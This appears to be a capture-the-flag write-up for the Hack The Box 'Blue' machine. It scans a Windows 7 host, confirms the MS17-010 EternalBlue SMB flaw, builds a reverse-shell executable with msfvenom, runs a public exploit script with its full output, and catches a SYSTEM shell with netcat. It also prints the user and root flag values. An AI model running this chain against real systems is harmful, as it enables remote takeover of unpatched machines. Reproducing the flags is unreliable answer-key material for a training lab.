# Scan

```bash
ghost@MacBook-Pro [11:24:17] [~/Documents/hacking/hackthebox/blue] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.40:135
Open 10.10.10.40:139
Open 10.10.10.40:445
Open 10.10.10.40:49152
Open 10.10.10.40:49153
Open 10.10.10.40:49154
Open 10.10.10.40:49155
Open 10.10.10.40:49157
Open 10.10.10.40:49156

Host script results:
| smb2-time:
|   date: 2022-11-28T03:27:38
|_  start_date: 2022-11-27T14:27:53
| smb2-security-mode:
|   210:
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 2s, median: -2s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-28T03:27:39+00:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 29887/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 9358/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```


# SMB (445)

```bash
ghost@MacBook-Pro [11:29:44] [~/Documents/hacking/hackthebox/blue] [master]
-> % nmap --script smb-vuln\* -p 445 $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-28 11:33 +08
Nmap scan report for 10.10.10.40
Host is up (0.26s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds
```

This SMB version is vulnerable to RCE (https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0143).

It is an eternal blue exploit (https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/). The target is running *Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)*.

I am using an exploit from this (https://github.com/helviojunior/MS17-010).

First I generate a payload.

```bash
khant@Khants-MacBook-Pro [14:02:35] [~/Documents/hacking/hackthebox/blue] [master *]
-> % msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev.exe
```

I use `send_and_execute.py` from the exploit. Before I run, I set the username.

```python
...
USERNAME = 'pwn3d'
PASSWORD = ''
...
```

Then execute the script.

```bash
khant@Khants-MacBook-Pro [14:09:33] [~/Documents/hacking/hackthebox/blue] [master *]
-> % python MS17-010/send_and_execute.py 10.10.10.40 rev.exe
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8002e15020
SESSION: 0xfffff8a0012f6520
FLINK: 0xfffff8a001b04088
InParam: 0xfffff8a001aed15c
MID: 0x4003
unexpected alignment, diff: 0x16088
leak failed... try again
CONNECTION: 0xfffffa8002e15020
SESSION: 0xfffff8a0012f6520
FLINK: 0xfffff8a001b10088
InParam: 0xfffff8a001b0a15c
MID: 0x4003
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Sending file T8QM0N.exe...
Opening SVCManager on 10.10.10.40.....
Creating service PCuh.....
Starting service PCuh.....
The NETBIOS connection with the remote host timed out.
Removing service PCuh.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

I receives back reverse shell.

```bash
khant@Khants-MacBook-Pro [14:04:20] [~/Documents/hacking/hackthebox/blue] [master *]
-> % nc -lvnp 4444
Connection from 10.10.10.40:49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
a4b18d5e6f8e56f68533129c71079ba5

C:\Windows\system32>type c:\users\haris\desktop\user.txt
4b2830679ad69c81812357a46eb6cc74
```
